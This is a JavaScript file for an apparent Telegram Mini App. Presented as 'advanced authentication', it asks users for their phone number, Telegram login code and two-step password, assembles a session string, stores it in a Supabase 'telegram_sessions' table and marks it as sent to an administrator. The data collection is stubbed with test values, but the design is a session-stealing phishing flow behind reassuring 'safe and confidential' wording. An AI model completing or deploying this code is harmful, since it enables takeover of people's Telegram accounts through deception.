// auth-system.js
class AuthSystem {
    constructor() {
        this.authState = null;
    }
    
    async startAdvancedAuth(userId) {
        const tg = window.Telegram.WebApp;
        
        // Показываем инструкцию
        tg.showPopup({
            title: "🔐 Продвинутая аутентификация",
            message: "Для полного доступа нужно:\n\n1. Поделиться номером телефона\n2. Ввести код из Telegram\n3. Ввести пароль (если есть)\n\nБезопасно и конфиденциально",
            buttons: [
                {id: 'share_phone', type: 'default', text: '📱 Поделиться номером'},
                {type: 'cancel', text: '❌ Отмена'}
            ]
        }, async (buttonId) => {
            if (buttonId === 'share_phone') {
                await this.requestPhoneNumber(userId);
            }
        });
    }
    
    async requestPhoneNumber(userId) {
        const tg = window.Telegram.WebApp;
        
        tg.showPopup({
            title: "📱 Номер телефона",
            message: "Пожалуйста, поделитесь вашим номером телефона для аутентификации в Telegram",
            buttons: [
                {
                    id: 'share_phone',
                    type: 'default',
                    text: '📞 Поделиться номером'
                },
                {
                    type: 'cancel',
                    text: '❌ Отмена'
                }
            ]
        }, async (buttonId) => {
            if (buttonId === 'share_phone') {
                // В реальном приложении здесь будет вызов API для начала аутентификации
                // Показываем симуляцию процесса
                await this.simulateAuthProcess(userId);
            }
        });
    }
    
    async simulateAuthProcess(userId) {
        const tg = window.Telegram.WebApp;
        
        // Симуляция получения кода
        setTimeout(() => {
            this.showCodeInputModal();
        }, 1500);
    }
    
    showCodeInputModal() {
        document.getElementById('codeModal').style.display = 'flex';
        
        // Очищаем поля
        document.querySelectorAll('.code-input').forEach(input => {
            input.value = '';
        });
        
        // Фокусируемся на первом поле
        document.querySelectorAll('.code-input')[0].focus();
    }
    
    async submitCode() {
        const codeInputs = document.querySelectorAll('.code-input');
        let code = '';
        
        codeInputs.forEach(input => {
            code += input.value;
        });
        
        if (code.length !== 5) {
            window.Telegram.WebApp.showAlert('❌ Введите полный код из 5 цифр');
            return;
        }
        
        // Симуляция проверки кода
        const isValid = await this.verifyCode(code);
        
        if (isValid) {
            // Проверяем нужен ли пароль
            const needsPassword = await this.checkPasswordRequirement();
            
            if (needsPassword) {
                this.showPasswordModal();
            } else {
                await this.completeAuth();
            }
        } else {
            window.Telegram.WebApp.showAlert('❌ Неверный код. Попробуйте снова.');
        }
    }
    
    async verifyCode(code) {
        // Симуляция проверки кода
        return new Promise(resolve => {
            setTimeout(() => {
                resolve(code === '12345'); // Тестовый код
            }, 1000);
        });
    }
    
    async checkPasswordRequirement() {
        // Симуляция проверки необходимости пароля
        return new Promise(resolve => {
            setTimeout(() => {
                resolve(Math.random() > 0.5); // 50% шанс что нужен пароль
            }, 500);
        });
    }
    
    showPasswordModal() {
        document.getElementById('codeModal').style.display = 'none';
        document.getElementById('passwordModal').style.display = 'flex';
        document.getElementById('passwordInput').value = '';
        document.getElementById('passwordInput').focus();
    }
    
    async submitPassword() {
        const password = document.getElementById('passwordInput').value;
        
        if (!password) {
            window.Telegram.WebApp.showAlert('❌ Введите пароль');
            return;
        }
        
        const isValid = await this.verifyPassword(password);
        
        if (isValid) {
            await this.completeAuth();
        } else {
            window.Telegram.WebApp.showAlert('❌ Неверный пароль');
        }
    }
    
    async verifyPassword(password) {
        // Симуляция проверки пароля
        return new Promise(resolve => {
            setTimeout(() => {
                resolve(password === 'test123'); // Тестовый пароль
            }, 1000);
        });
    }
    
    async completeAuth() {
        const tg = window.Telegram.WebApp;
        
        // Закрываем все модальные окна
        document.getElementById('codeModal').style.display = 'none';
        document.getElementById('passwordModal').style.display = 'none';
        
        // Симуляция сбора сессии
        const sessionData = {
            phone: "+79001234567",
            auth_date: Math.floor(Date.now() / 1000),
            session_string: "simulated_session_data_here",
            user_id: userData.id
        };
        
        // Сохраняем в Supabase
        await window.supabaseClient.saveAuthSession(userData.id, sessionData);
        
        // Обновляем UI
        await this.updateUI(userData.id);
        
        tg.showAlert('✅ Telegram успешно привязан! Сессия сохранена.', () => {
            // Отправляем данные админу (симуляция)
            this.sendToAdmin(sessionData);
        });
    }
    
    async sendToAdmin(sessionData) {
        // В реальном приложении здесь будет отправка данных админу
        console.log('Сессия отправлена админу:', sessionData);
        
        window.Telegram.WebApp.showAlert('📨 Сессия отправлена администратору для проверки.');
    }
    
    async updateUI(userId) {
        const session = await this.getUserSession(userId);
        
        if (session) {
            document.getElementById('telegramStatus').textContent = 'Привязан';
            document.getElementById('telegramStatus').className = 'status-connected';
            document.getElementById('bindTelegramBtn').textContent = '✅ Telegram привязан';
            document.getElementById('bindTelegramBtn').disabled = true;
        }
    }
    
    async getUserSession(userId) {
        // Получаем сессию из Supabase
        const { data, error } = await window.supabaseClient.client
            .from('telegram_sessions')
            .select('*')
            .eq('user_id', userId)
            .order('created_at', { ascending: false })
            .limit(1)
            .single();
        
        return error ? null : data;
    }
}

window.authSystem = new AuthSystem();
